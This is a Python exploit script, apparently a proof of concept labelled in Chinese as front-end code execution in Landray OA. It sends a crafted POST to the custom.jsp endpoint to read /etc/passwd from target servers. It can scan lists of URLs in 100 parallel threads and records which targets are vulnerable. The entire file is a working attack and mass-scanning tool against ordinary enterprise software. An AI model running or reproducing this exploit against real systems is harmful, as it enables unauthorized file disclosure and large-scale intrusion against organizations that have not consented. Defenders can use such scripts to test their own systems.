#蓝凌OA前台代码执行
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def main():
    parser = argparse.ArgumentParser(description="蓝凌OA前台代码执行")
    parser.add_argument('-u','--url',dest='url',type=str,help="input link")
    parser.add_argument('-f','--file',dest='file',type=str,help="file path")
    
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8')as f:
            for i in f.readlines():
                url_list.append(i.strip().replace('\n',''))
        
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print((f"Useag:\n\t python {sys.argv[0]} -h"))
def poc(target):
    payload = "/sys/ui/extend/varkind/custom.jsp"
    url = target+payload
    headers = {
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
        "Accept": "/",
        "Connection": "keep-alive",
        "Content-Length": "42",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = {
        'var':'{"body":{"file":"file:///etc/passwd"}}'
    }
    
    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=10)
        if res.status_code == 200 and 'root:x:0:0' in res.text:
            print(f'该url{target}存在漏洞')
            with open('result.txt','a',encoding='utf-8')as fp:
                fp.write(target+'\n')
        else:
            print(f'该url{target}不存在漏洞')
    except:
        print("该站点可能存在问题，请手动测试")

if __name__ == '__main__':
    main()